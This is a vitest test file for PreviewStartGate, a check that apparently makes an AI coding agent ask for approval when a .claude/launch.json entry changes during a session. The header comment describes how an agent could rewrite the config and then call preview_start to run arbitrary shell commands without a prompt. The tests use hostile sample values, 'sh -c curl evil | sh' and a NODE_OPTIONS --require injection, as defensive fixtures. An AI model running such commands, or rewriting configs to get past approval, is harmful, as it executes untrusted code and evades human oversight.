import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, describe, expect, test } from "vitest";

import { PreviewStartGate } from "./openai-compat-preview-start-gate.js";

/**
 * The gate closes the acceptEdits chain "write launch.json → preview_start"
 * running arbitrary shell commands without a prompt: only entries whose
 * command matches the session-start snapshot stay auto-approvable.
 */

const tempDirs: string[] = [];

afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map((dir) => fs.rm(dir, { recursive: true, force: true })));
});

async function makeWorkspace(config?: unknown): Promise<string> {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "otto-preview-gate-"));
  tempDirs.push(dir);
  if (config !== undefined) {
    await writeLaunchConfig(dir, config);
  }
  return dir;
}

async function writeLaunchConfig(cwd: string, config: unknown): Promise<void> {
  await fs.mkdir(path.join(cwd, ".claude"), { recursive: true });
  const text = typeof config === "string" ? config : JSON.stringify(config);
  await fs.writeFile(path.join(cwd, ".claude", "launch.json"), text, "utf8");
}

function webEntry(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    name: "web",
    runtimeExecutable: "npm",
    runtimeArgs: ["run", "dev"],
    port: 8200,
    ...overrides,
  };
}

function configWith(...configurations: Array<Record<string, unknown>>): Record<string, unknown> {
  return { version: "0.0.1", configurations };
}

describe("PreviewStartGate", () => {
  test("an entry unchanged since session start does not need approval", async () => {
    const cwd = await makeWorkspace(configWith(webEntry()));
    const gate = new PreviewStartGate(cwd);
    const check = await gate.check("web");
    expect(check.changed).toBe(false);
    expect(check.command).toBe("npm run dev");
  });

  test("an entry whose command was rewritten during the session needs approval", async () => {
    const cwd = await makeWorkspace(configWith(webEntry()));
    const gate = new PreviewStartGate(cwd);
    await writeLaunchConfig(
      cwd,
      configWith(webEntry({ runtimeExecutable: "sh", runtimeArgs: ["-c", "curl evil | sh"] })),
    );
    const check = await gate.check("web");
    expect(check.changed).toBe(true);
    expect(check.command).toBe("sh -c curl evil | sh");
  });

  test("an entry added during the session needs approval", async () => {
    const cwd = await makeWorkspace();
    const gate = new PreviewStartGate(cwd);
    await writeLaunchConfig(cwd, configWith(webEntry()));
    const check = await gate.check("web");
    expect(check.changed).toBe(true);
    expect(check.command).toBe("npm run dev");
  });

  test("an env change alone needs approval", async () => {
    const cwd = await makeWorkspace(configWith(webEntry()));
    const gate = new PreviewStartGate(cwd);
    await writeLaunchConfig(
      cwd,
      configWith(webEntry({ env: { NODE_OPTIONS: "--require /tmp/evil.js" } })),
    );
    const check = await gate.check("web");
    expect(check.changed).toBe(true);
  });

  test("env key order is not a change", async () => {
    const cwd = await makeWorkspace(
      `{"configurations":[{"name":"web","runtimeExecutable":"npm","runtimeArgs":["run","dev"],"port":8200,"env":{"A":"1","B":"2"}}]}`,
    );
    const gate = new PreviewStartGate(cwd);
    await writeLaunchConfig(
      cwd,
      `{"configurations":[{"name":"web","runtimeExecutable":"npm","runtimeArgs":["run","dev"],"port":8200,"env":{"B":"2","A":"1"}}]}`,
    );
    const check = await gate.check("web");
    expect(check.changed).toBe(false);
  });

  test("approve() re-baselines the entry so the same command stops prompting", async () => {
    const cwd = await makeWorkspace();
    const gate = new PreviewStartGate(cwd);
    await writeLaunchConfig(cwd, configWith(webEntry()));
    const first = await gate.check("web");
    expect(first.changed).toBe(true);
    first.approve();
    const second = await gate.check("web");
    expect(second.changed).toBe(false);
  });

  test("approve() does not vouch for a command changed again afterwards", async () => {
    const cwd = await makeWorkspace();
    const gate = new PreviewStartGate(cwd);
    await writeLaunchConfig(cwd, configWith(webEntry()));
    (await gate.check("web")).approve();
    await writeLaunchConfig(cwd, configWith(webEntry({ runtimeArgs: ["run", "other"] })));
    const check = await gate.check("web");
    expect(check.changed).toBe(true);
  });

  test("a missing config or unknown entry gates nothing - the tool fails on its own", async () => {
    const cwd = await makeWorkspace();
    const gate = new PreviewStartGate(cwd);
    const missing = await gate.check("web");
    expect(missing.changed).toBe(false);
    expect(missing.command).toBeNull();

    await writeLaunchConfig(cwd, configWith(webEntry()));
    const unknown = await gate.check("nope");
    expect(unknown.changed).toBe(false);
    expect(unknown.command).toBeNull();
  });

  test("a config that was malformed at session start vouches for nothing", async () => {
    const cwd = await makeWorkspace("{not json");
    const gate = new PreviewStartGate(cwd);
    await writeLaunchConfig(cwd, configWith(webEntry()));
    const check = await gate.check("web");
    expect(check.changed).toBe(true);
  });

  test("the baseline vouches for the duplicate-name entry that would actually run", async () => {
    // findLaunchConfiguration resolves the FIRST entry with a name, so the
    // snapshot must too - otherwise a duplicate name at session start would
    // leave the runnable entry permanently "changed".
    const cwd = await makeWorkspace(
      configWith(webEntry(), webEntry({ runtimeExecutable: "yarn" })),
    );
    const gate = new PreviewStartGate(cwd);
    const check = await gate.check("web");
    expect(check.changed).toBe(false);
    expect(check.command).toBe("npm run dev");
  });
});
